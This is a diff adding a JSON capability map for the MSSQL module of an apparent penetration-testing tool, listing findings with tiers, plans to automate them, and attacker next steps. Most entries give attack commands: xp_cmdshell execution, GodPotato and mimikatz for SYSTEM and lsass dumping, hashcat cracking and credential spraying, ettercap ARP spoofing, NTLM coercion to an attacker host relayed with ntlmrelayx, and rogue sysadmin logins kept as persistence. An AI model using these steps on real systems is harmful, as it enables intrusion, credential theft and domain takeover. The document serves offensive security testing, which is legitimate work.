@@ -1,0 +1,330 @@
+{
+  "service": "mssql",
+  "module_files": [
+    "recce/services/db/mssql.py"
+  ],
+  "summary": "Very mature module (2497 LOC). Pre-auth: SQL Browser UDP 1434, TDS PRELOGIN version/encryption, TDS NTLM info leak (Type-1/Type-2), native SQL-auth login (TLS-over-TDS), weak-sa sweep, MSSQLSvc SPN emission. Credentialed: full impacket-mssqlclient enumeration of logins/dbs/trustworthy/links/impersonation/hashes/creds/proxies/serverperms/publicperms/startup + OPENROWSET file-read T1 probe + multi-hop impersonation-chain resolver + reversible write proof + recursive linked-server BFS + xp_dirtree/BACKUP-UNC coercion + xp_cmdshell/OLE/Agent/CLR RCE. Biggest gap: no true T3 automation \u2014 cred-verified sysadmin execution never wired to actual foothold (recce leaves shell to operator per user directive); NTLM relay is coercion-only, no bundled relay listener; Kerberoasting only emits SPN, doesn't request TGS itself.",
+  "proposed_shared_surface_consumers": [
+    "known_users",
+    "known_hostkeys",
+    "relay_targets",
+    "known_creds",
+    "known_hashes",
+    "known_spns",
+    "linked_targets"
+  ],
+  "findings": [
+    {
+      "kind": "mssql_default_creds",
+      "tier": "t2",
+      "severity": "critical",
+      "title_pattern": "MSSQL default credentials still active",
+      "tier_evidence": "weak_sa_sweep() executes a native TDS SQL-auth login and only fires the finding when LOGINACK is observed \u2014 cred is proven, not guessed.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Auto-run enable_xp_cmdshell + xp_cmdshell 'whoami' on hit and cache the shell handle in the session; write captured whoami into loot store.",
+      "promotion_risk": "medium",
+      "tester_next_step": "impacket-mssqlclient sa@<ip> -p <port> (blank/known pw), then: enable_xp_cmdshell; xp_cmdshell whoami \u2014 for SeImpersonate follow with GodPotato/PrintSpoofer to SYSTEM.",
+      "related_cves": []
+    },
+    {
+      "kind": "blank_login",
+      "tier": "t1",
+      "severity": "critical",
+      "title_pattern": "MSSQL login with a blank password (sysadmin -> RCE)",
+      "tier_evidence": "Blank-login finding gates strictly on nmap ms-sql-empty-password 'Login Success' marker or a parsed vuln \u2014 positive evidence only. Note weak-sa also covers this path at T2 natively.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Fold into weak_sa_sweep so the finding is always emitted by native verifier, not just nmap NSE; add explicit CVE-independent verify step.",
+      "promotion_risk": "low",
+      "tester_next_step": "impacket-mssqlclient sa@<ip> -p <port> with blank; then EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'."
+    },
+    {
+      "kind": "xp_cmdshell",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "xp_cmdshell is enabled (OS command execution)",
+      "tier_evidence": "Emitted from nmap ms-sql-xp-cmdshell script output OR from live sys.configurations query (cfg['xp_cmdshell']=='1'). Both are deterministic checks that the primitive is live.",
+      "can_promote_to": "t2",
+      "promotion_notes": "When creds present, actually EXEC xp_cmdshell 'echo <canary>' via exec_command() and attach captured stdout as tier_evidence \u2014 the code already exists (build_exec_script). Only unwired for the enum-only path.",
+      "promotion_risk": "medium",
+      "tester_next_step": "nxc mssql <ip> -u <user> -p <pass> -x whoami OR impacket-mssqlclient <user>@<ip> then xp_cmdshell whoami. Capture host + service acct + SeImpersonate for potato chain."
+    },
+    {
+      "kind": "rce_confirmed",
+      "tier": "t2",
+      "severity": "critical",
+      "title_pattern": "MSSQL RCE proved via xp_cmdshell/OLE/agent",
+      "tier_evidence": "exec_command() runs a controlled command through xp/ole/agent primitives and captures stdout between @@X:out sentinels \u2014 output IS the proof. Narrative present in _NARRATIVE but not emitted directly as a kind; sysadmin_creds/xp_cmdshell drive execution.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Wire exec_command() output as a first-class 'rce_confirmed' finding kind (currently only narrative) so GUI shows the captured whoami as evidence, upgrading severity when SYSTEM or Domain Admin detected in output.",
+      "promotion_risk": "medium",
+      "tester_next_step": "impacket-mssqlclient with creds; enable_xp_cmdshell; xp_cmdshell 'whoami /all' then whoami /priv \u2014 if SeImpersonate present, drop GodPotato via powershell -c IEX to reach NT AUTHORITY\\SYSTEM."
+    },
+    {
+      "kind": "sysadmin_creds",
+      "tier": "t1",
+      "severity": "critical",
+      "title_pattern": "Credentials are sysadmin on this MSSQL instance",
+      "tier_evidence": "Emitted only when live SELECT IS_SRVROLEMEMBER('sysadmin')=1 for the connected login. Confirmed capability, not inferred.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Same as xp_cmdshell: run exec_command via 'xp' automatically on sysadmin verify and attach captured whoami / hostname / sid; converts capability finding to proof-of-exploit.",
+      "promotion_risk": "medium",
+      "tester_next_step": "impacket-mssqlclient <domain>/<user>:<pass>@<ip>; enable_xp_cmdshell; xp_cmdshell whoami. From there SeImpersonate -> potato -> SYSTEM -> lsass.exe dump via mimikatz/nanodump."
+    },
+    {
+      "kind": "impersonation",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "Impersonatable sysadmin login (privesc to sysadmin)",
+      "tier_evidence": "Live query sys.server_permissions where permission_name='IMPERSONATE' AND grantor is sysadmin \u2014 deterministic capability check.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Execute EXECUTE AS LOGIN='<sa>'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin'); REVERT and attach the observed context switch as evidence.",
+      "promotion_risk": "low",
+      "tester_next_step": "In mssqlclient: EXECUTE AS LOGIN='sa'; SELECT IS_SRVROLEMEMBER('sysadmin'); then EXEC xp_cmdshell 'whoami'; REVERT."
+    },
+    {
+      "kind": "trustworthy",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "TRUSTWORTHY database owned by a sysadmin (privesc)",
+      "tier_evidence": "Emitted from live sys.databases (is_trustworthy_on=1 AND owner in sysadmin set). Elevated to critical + 'CONFIRMED' when verify_dbowner() runs and IS_MEMBER('db_owner')=1 in the target DB context \u2014 that's a T2 confirmation of the escalation primitive.",
+      "can_promote_to": "t2",
+      "promotion_notes": "When dbo_map confirms db_owner, auto-create the WITH EXECUTE AS OWNER proc under a temp name, invoke it to add current login to sysadmin, verify, and REVERT with sp_dropsrvrolemember + DROP PROCEDURE \u2014 reversible T2 proof (mirrors write_proof pattern).",
+      "promotion_risk": "high",
+      "tester_next_step": "USE [<trustdb>]; CREATE PROC dbo.x WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember '<user>','sysadmin'; EXEC dbo.x; verify IS_SRVROLEMEMBER('sysadmin')=1; then EXEC sp_dropsrvrolemember."
+    },
+    {
+      "kind": "linked_reachable",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "N linked server(s) reachable (lateral / privesc)",
+      "tier_evidence": "Live sys.servers (is_linked=1) enumeration; walk_links BFS actually reaches each remote node with OPENQUERY/EXEC AT and returns real SYSTEM_USER + IS_SRVROLEMEMBER \u2014 deterministic reachability.",
+      "can_promote_to": "t2",
+      "promotion_notes": "walk_links already returns login/sysadmin per node; auto-tag each node's chain with a canary SELECT and attach path for GUI graph.",
+      "promotion_risk": "low",
+      "tester_next_step": "SELECT * FROM OPENQUERY([LINKED], 'SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')'); if sa, EXEC('sp_configure ''xp_cmdshell'',1;RECONFIGURE;EXEC xp_cmdshell ''whoami''') AT [LINKED]."
+    },
+    {
+      "kind": "linked_sysadmin",
+      "tier": "t2",
+      "severity": "critical",
+      "title_pattern": "Linked-server chain to SYSADMIN on <server>",
+      "tier_evidence": "walk_links() ran the nested EXEC-AT chain and observed IS_SRVROLEMEMBER('sysadmin')=1 on the remote node's live result \u2014 that's proof the chain executes as sysadmin.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Auto-invoke _nested_at(path, _RCE_INNER) which enables xp_cmdshell AND runs whoami on the remote and captures output \u2014 code already there; just needs to be executed and stored as evidence rather than emitted as a copy-paste cmd.",
+      "promotion_risk": "high",
+      "tester_next_step": "EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''',1;RECONFIGURE;EXEC xp_cmdshell ''''whoami'''''') AT [HOP2]') AT [HOP1] \u2014 use link_runner then walk chain; capture whoami output on remote."
+    },
+    {
+      "kind": "hashes",
+      "tier": "t3",
+      "severity": "high",
+      "title_pattern": "Recovered N SQL login password hash(es)",
+      "tier_evidence": "SELECT name,password_hash FROM sys.sql_logins actually returned hashes \u2014 a foothold-grade capture of credential material.",
+      "can_promote_to": "t4",
+      "promotion_notes": "Feed hashes into a bundled offline cracker sweep against a small wordlist (hashcat -m 1731 is airgap-friendly) and, on cracked, auto-spray back with sqlauth_login across all mssql_targets \u2014 chain step.",
+      "promotion_risk": "low",
+      "tester_next_step": "hashcat -m 1731 mssql_hashes.txt rockyou.txt; then for each cracked, sqlauth_login sprays across every discovered MSSQL \u2014 plus try each cracked pw against SMB/LDAP for account reuse."
+    },
+    {
+      "kind": "mssql_openrowset_read",
+      "tier": "t2",
+      "severity": "high",
+      "title_pattern": "Arbitrary file read via OPENROWSET(BULK) confirmed",
+      "tier_evidence": "The fileread enum section actually SELECTs C:\\Windows\\System32\\drivers\\etc\\hosts via OPENROWSET(BULK, SINGLE_CLOB) and returns 64-byte proof sample \u2014 controlled canary read confirms primitive.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Automate follow-on reads of well-known sensitive files (C:\\inetpub\\wwwroot\\web.config, C:\\ProgramData\\<app>\\config, C:\\Windows\\System32\\config\\SYSTEM copy via VSS) and parse for connection strings \u2014 feed into known_creds.",
+      "promotion_risk": "medium",
+      "tester_next_step": "SELECT BulkColumn FROM OPENROWSET(BULK 'C:\\inetpub\\wwwroot\\web.config', SINGLE_CLOB) AS x; grep <add name= for DB connection strings and reuse."
+    },
+    {
+      "kind": "mssql_impersonation_chain",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "MSSQL impersonation chain to sysadmin available",
+      "tier_evidence": "impersonate_chain query lists login + IS_SRVROLEMEMBER + onward-impersonation count from live sys.server_permissions \u2014 evidence of transitive hop existence.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Walk the resolved chain via nested EXECUTE AS ... EXECUTE AS ... blocks with a canary IS_SRVROLEMEMBER at the end and REVERT; capture the terminal sysadmin=1 as proof.",
+      "promotion_risk": "medium",
+      "tester_next_step": "EXECUTE AS LOGIN='<hop1>'; EXECUTE AS LOGIN='<hop2>'; SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin'); REVERT; REVERT \u2014 then xp_cmdshell inside the sa context."
+    },
+    {
+      "kind": "stored_credentials",
+      "tier": "t0",
+      "severity": "high",
+      "title_pattern": "N stored SQL credential object(s)",
+      "tier_evidence": "Reads sys.credentials + msdb.dbo.sysproxies identity strings only \u2014 the passwords remain encrypted with SMK. Enumeration of privilege-carrying objects, not proof they can be decrypted.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Port PowerUpSQL Get-SQLServerLinkedServerLogin's SMK-decryption path (T-SQL DAC + xp_ readvarbin) into a native T-SQL recovery script; on sysadmin, decrypt one and add to loot as proof. Requires DAC and sysadmin.",
+      "promotion_risk": "high",
+      "tester_next_step": "PowerUpSQL: Import-Module PowerUpSQL; Get-SQLCredential -Instance <ip>; Get-SQLServerLinkedServerLogin -Instance <ip> \u2014 needs sysadmin + DAC (add ,1434 to conn or -DAC)."
+    },
+    {
+      "kind": "linked_fixed_login",
+      "tier": "t0",
+      "severity": "high",
+      "title_pattern": "N linked server(s) with a stored fixed login",
+      "tier_evidence": "Enumerates sys.linked_logins where uses_self_credential=0 and remote_name is set \u2014 surfaces the *existence* of stored linked-server passwords; recce doesn't yet decrypt them.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Same as stored_credentials: implement SMK decryption of syslnklgns via DAC, prove one linked-server password recovery, elevate severity to critical when remote_name is 'sa'.",
+      "promotion_risk": "high",
+      "tester_next_step": "mssqlpwner <domain>/<user>:<pass>@<ip> get-linked-server-password (needs sa+DAC); then reuse recovered pw against remote via impacket-mssqlclient."
+    },
+    {
+      "kind": "ntlm_disclosure",
+      "tier": "t1",
+      "severity": "low",
+      "title_pattern": "MSSQL discloses NetBIOS / domain / FQDN pre-auth (NTLM)",
+      "tier_evidence": "Native _build_login7_ntlm sends real NTLMSSP Type-1 and parses Type-2 AV_PAIRs; leak proven by successful Type-2 parse.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Already used to seed kerberoast_spn \u2014 feed dns_computer/nb_domain into shared known_hosts + known_domains surfaces so other modules stop re-probing.",
+      "promotion_risk": "none",
+      "tester_next_step": "responder -I <iface> already listening; then trigger EXEC xp_dirtree '\\\\<LHOST>\\x' via any authenticated login to relay/capture the SQL svc acct."
+    },
+    {
+      "kind": "mssql_kerberoastable_spn",
+      "tier": "t0",
+      "severity": "medium",
+      "title_pattern": "MSSQL registers a Kerberoastable SPN (MSSQLSvc)",
+      "tier_evidence": "Emits the computed SPN string MSSQLSvc/<fqdn>:<port> \u2014 asserts registration by domain-integration inference, does not request a TGS itself.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Integrate impacket-GetUserSPNs against a supplied domain user to actually request the TGS and capture the $krb5tgs$ hash \u2014 proof-of-exploit tier once hash is returned.",
+      "promotion_risk": "low",
+      "tester_next_step": "impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc-ip> -request; then hashcat -m 13100 tgs.hash rockyou.txt.",
+      "related_cves": []
+    },
+    {
+      "kind": "no_encryption",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "MSSQL does not support login encryption (credential sniffing)",
+      "tier_evidence": "Parsed from server PRELOGIN encryption option byte == 2 (not supported) \u2014 deterministic server assertion.",
+      "can_promote_to": "stay",
+      "promotion_notes": "Already at T1 \u2014 server tells us. Only promotion would be actually sniffing a real auth via mitm, which is out of scope.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "Position on-path (ettercap -Tq -M arp:remote /<sqlclient>/ /<sqlsrv>/); capture with tcpdump port 1433; extract LOGIN7 payload \u2014 password is obfuscated with nibble-swap+0xA5, trivially reversed."
+    },
+    {
+      "kind": "eol",
+      "tier": "t0",
+      "severity": "medium",
+      "title_pattern": "End-of-life SQL Server (<name>)",
+      "tier_evidence": "Version <= 12 (SQL 2014) from PRELOGIN \u2014 banner assertion only, no CVE proof.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Extend PRELOGIN version to CVE map (like MySQL/Postgres modules do) \u2014 CVE-2020-0618 (RS-RCE), CVE-2021-1636 (SSMS), CVE-2022-29143 \u2014 emit per-CVE candidate findings.",
+      "promotion_risk": "none",
+      "tester_next_step": "For SQL 2012/2014 SSRS on same host: msf exploit/windows/mssql/mssql_ssrs_navcorrector (CVE-2020-0618); otherwise consult MSRC bulletins.",
+      "related_cves": []
+    },
+    {
+      "kind": "mixed_mode",
+      "tier": "t0",
+      "severity": "low",
+      "title_pattern": "Mixed-mode authentication enabled (SQL logins)",
+      "tier_evidence": "SERVERPROPERTY('IsIntegratedSecurityOnly')=0 \u2014 server config assertion, not evidence of any weak account.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Cross-reference with weak_sa_sweep result and any looted hashes to confirm the config actually enables an attack \u2014 auto-upgrade when a spray hit lands.",
+      "promotion_risk": "low",
+      "tester_next_step": "nxc mssql <ip> -u sa -p passwords.txt --local-auth --continue-on-success \u2014 with the sa hash from sys.sql_logins if you already have that."
+    },
+    {
+      "kind": "server_perms",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "Dangerous server-level permission held (privesc without sysadmin)",
+      "tier_evidence": "Live sys.fn_my_permissions(NULL,'SERVER') intersected with the _DANGEROUS_SERVER_PERMS set \u2014 proof this specific login holds the grant right now.",
+      "can_promote_to": "t2",
+      "promotion_notes": "For each detected perm (IMPERSONATE ANY LOGIN, ALTER ANY LOGIN, CONTROL SERVER, ADMINISTER BULK OPERATIONS) run the specific abuse (EXECUTE AS sa, ALTER LOGIN sa WITH PASSWORD, BULK read /etc/hosts canary) and attach output.",
+      "promotion_risk": "medium",
+      "tester_next_step": "IMPERSONATE ANY LOGIN: EXECUTE AS LOGIN='sa'; ALTER ANY LOGIN: ALTER LOGIN sa WITH PASSWORD='Recce!123'; CONTROL SERVER: implicit sa. Then xp_cmdshell whoami."
+    },
+    {
+      "kind": "public_role",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "Server permission granted to public (every login inherits it)",
+      "tier_evidence": "Live sys.server_permissions where grantee=public AND state=GRANT AND perm outside baseline \u2014 deterministic.",
+      "can_promote_to": "t2",
+      "promotion_notes": "Where the granted perm intersects DANGEROUS_SERVER_PERMS, drive the abuse from a freshly-created low-priv login (or existing guest) to prove the public inheritance is exploitable end-to-end.",
+      "promotion_risk": "high",
+      "tester_next_step": "CREATE LOGIN test WITH PASSWORD='x'; login as test; verify inherited dangerous perm; then abuse per server_perms tester step."
+    },
+    {
+      "kind": "startup_proc",
+      "tier": "t0",
+      "severity": "medium",
+      "title_pattern": "N startup stored procedure(s) present",
+      "tier_evidence": "master.sys.procedures ExecIsStartup=1 \u2014 inventory only, no attempt to inspect proc body for maliciousness.",
+      "can_promote_to": "t1",
+      "promotion_notes": "Fetch OBJECT_DEFINITION for each startup proc and regex for xp_cmdshell/OLE/net user \u2014 surface persistence candidates directly rather than a plain list.",
+      "promotion_risk": "low",
+      "tester_next_step": "SELECT name, OBJECT_DEFINITION(object_id) FROM master.sys.procedures WHERE OBJECTPROPERTY(object_id,'ExecIsStartup')=1; hunt for xp_cmdshell / EXEC master.dbo. / net user."
+    },
+    {
+      "kind": "guest_enabled",
+      "tier": "t1",
+      "severity": "medium",
+      "title_pattern": "'guest' enabled in N database(s)",
+      "tier_evidence": "Live sys.database_permissions check that grantee='guest' AND permission='CONNECT' AND state='GRANT' inside each db \u2014 deterministic capability.",
+      "can_promote_to": "t2",
+      "promotion_notes": "EXECUTE AS USER='guest'; enumerate tables and permissions accessible under guest \u2014 proves the boundary is actually gone rather than merely configured that way.",
+      "promotion_risk": "low",
+      "tester_next_step": "USE [<db>]; EXECUTE AS USER='guest'; SELECT * FROM INFORMATION_SCHEMA.TABLES; sample any sensitive table listed."
+    },
+    {
+      "kind": "object_perms",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "Objects accessible to public/guest (every login)",
+      "tier_evidence": "Live sys.database_permissions for grantee in (public,guest) with GRANT and strong perm (INSERT/UPDATE/EXECUTE/CONTROL/SELECT) \u2014 deterministic per-object capability.",
+      "can_promote_to": "t2",
+      "promotion_notes": "For each public-EXEC procedure, actually EXEC it (or check its definition for SETUSER/EXECUTE AS) \u2014 prove callable escalation primitive.",
+      "promotion_risk": "high",
+      "tester_next_step": "For public EXECUTE grants on procs: EXEC <schema>.<proc>; for SELECT grants: SELECT TOP 20 * FROM <schema>.<table>."
+    },
+    {
+      "kind": "data_at_rest",
+      "tier": "t3",
+      "severity": "high",
+      "title_pattern": "Sensitive data accessible in the databases",
+      "tier_evidence": "run_datamine actually SELECTs sys.tables/columns and returns row-count + interesting column names \u2014 proves the data is reachable. Finding is informational when no interesting names found.",
+      "can_promote_to": "t4",
+      "promotion_notes": "For each interesting column, SELECT TOP 3 with regex-redaction (mirror the mysql/postgres datamine) so the finding carries a redacted sample; then feed detected password-shaped values into known_creds.",
+      "promotion_risk": "low",
+      "tester_next_step": "In mssqlclient: SELECT TOP 20 <col1>,<col2> FROM <db>.<schema>.<table>; if pwd/token cols, hashcat/crack + reuse via nxc across the estate."
+    },
+    {
+      "kind": "write_proof",
+      "tier": "t2",
+      "severity": "critical",
+      "title_pattern": "Proved write + permission-modify capability (reversible)",
+      "tier_evidence": "build_write_proof_script actually CREATEs a table, UPDATEs a canary row, and (when sysadmin) CREATE LOGIN + ALTER SERVER ROLE ADD MEMBER then REVERTs everything; parse_write_proof reads back the before/after evidence \u2014 reversible proof of write and role-add primitives.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Once role-add is proven possible, keep the temp login for the rest of the session with a random password stored in loot as ephemeral persistence (undone at analyze() end) \u2014 that's a full T3 foothold.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "CREATE LOGIN recce_x WITH PASSWORD='R3cce!Aa', CHECK_POLICY=OFF; ALTER SERVER ROLE sysadmin ADD MEMBER recce_x \u2014 then sqlauth_login as recce_x from remote."
+    },
+    {
+      "kind": "relay",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "UNC coercion -> NTLM relay of the SQL service account",
+      "tier_evidence": "run_xp_dirtree drives an authenticated EXEC xp_dirtree '\\\\<lhost>\\recce' \u2014 coercion primitive is triggered on the wire; the target authenticating outbound is deterministic behaviour.",
+      "can_promote_to": "t3",
+      "promotion_notes": "Bundle a minimal relay listener (or shell out to impacket-ntlmrelayx configured against selected relay_targets) so the coerced NetNTLM is actually landed and captured \u2014 recce currently generates the trigger but leaves relaying to the operator.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "Terminal 1: impacket-ntlmrelayx -t ldaps://<dc> --delegate-access --no-dump; Terminal 2: EXEC master..xp_dirtree '\\\\<LHOST>\\recce' via mssqlclient \u2014 SQL svc acct relays to DC for RBCD.",
+      "related_cves": []
+    },
+    {
+      "kind": "mssql_backup_unc_coercion",
+      "tier": "t1",
+      "severity": "high",
+      "title_pattern": "MSSQL BACKUP-to-UNC coercion (low-priv NetNTLM capture)",
+      "tier_evidence": "build_backup_unc_script + run_backup_unc actually run BACKUP DATABASE ... TO DISK='\\\\<lhost>\\...' and RESTORE VERIFYONLY under any login holding BACKUP DATABASE \u2014 coercion is deterministic on the wire. Narrative + code exist but the emitted finding-kind for the primitive is not currently in findings() (needs wiring).",
+      "can_promote_to": "t3",
+      "promotion_notes": "Auto-fire when the current login lacks xp_cmdshell/sysadmin but has BACKUP DATABASE (check via IS_SRVROLEMEMBER('dbcreator') / db-level backup rights), pair with bundled ntlmrelayx.",
+      "promotion_risk": "destructive",
+      "tester_next_step": "ntlmrelayx -t smb://<target> -smb2support; then BACKUP DATABASE master TO DISK='\\\\<LHOST>\\r\\x.bak' WITH INIT (as any BACKUP-rights account)."
+    }
+  ]
+}
